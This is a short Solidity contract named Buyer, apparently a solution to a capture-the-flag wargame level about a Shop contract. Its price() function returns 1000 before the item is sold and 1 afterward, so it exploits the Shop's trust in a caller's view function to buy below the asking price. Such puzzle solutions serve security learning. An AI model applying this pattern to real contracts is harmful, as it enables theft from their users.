// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { Shop } from "./Shop.sol";

contract Buyer {
    Shop shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view returns (uint) {
        if (! shop.isSold()) {
            return 1000;
        }
        return 1;
    }


    function buy() external {
        shop.buy();
    }
}